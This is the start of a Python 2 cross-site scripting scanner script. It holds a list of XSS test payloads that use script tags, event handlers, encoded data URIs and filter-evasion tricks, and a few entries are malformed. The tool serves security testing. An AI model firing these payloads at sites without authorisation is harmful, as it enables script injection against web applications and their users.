#!/usr/bin/env python
# -*- coding: cp1252 -*-
# XSSA is a Cross Site Scripting Scanner & Vulnerability Confirmation 
# By Yehia Mamdouh - twitter.com/@Yehia1mamdouh / Facebook/yehia.mamdouh.98


import urllib
import re
import urllib2


class check:
        def __init__(self):
                self.hit = ["<script>alert('XSSYA')</script>",
                            "1<ScRiPt >prompt(962477)</sCripT>",
                            "<script>alert('xssya')</script>",
                            "'';!--\"<XSS>=&{()}",
                            "<ScRipt>ALeRt('xssya');</sCRipT>",
                            "<body/onhashchange=alert(1)><a href=#>clickit",
                            "<img src=x onerror=prompt(1);>",
                            "%3cvideo+src%3dx+onerror%3dprompt(1)%3b%3e",
                            "<iframesrc=\"javascript:alert(2)\">",
                            "<iframe/src=\"data:text&sol;html;&Tab;base64&NewLine;,PGJvZHkgb25sb2FkPWFsZXJ0KDEpPg==\">",
                            "<form action=\"Javascript:alert(1)\"><input type=submit>",
                            "<isindex action=data:text/html, type=image>",
                            "<object data=\"data:text/html;base64,PHNjcmlwdD5hbGVydCgiSGVsbG8iKTs8L3NjcmlwdD4=\">",
                            "<svg/onload=prompt(1);>",
                            "<marquee/onstart=confirm(2)>/",
                            "<body onload=prompt(1);>",
                            "<q/oncut=open()>",
                            "<a onmouseover=location=’javascript:alert(1)>click",
                            "<svg><script>alert&#40/1/&#41</script>",
                            "&lt;/script&gt;&lt;script&gt;alert(1)&lt;/script&gt;",
                            "<scri%00pt>alert(1);</scri%00pt>",
                            "<scri%00pt>confirm(0);</scri%00pt>",
                            "5\x72\x74\x28\x30\x29\x3B'>rhainfosec",
                            "<isindex action=j&Tab;a&Tab;vas&Tab;c&Tab;r&Tab;ipt:alert(1) type=image>",
                            "<marquee/onstart=confirm(2)>",
                            "<A HREF=\"http://www.google.com./\">XSS</A>",
                            "<svg/onload=prompt(1);>",]


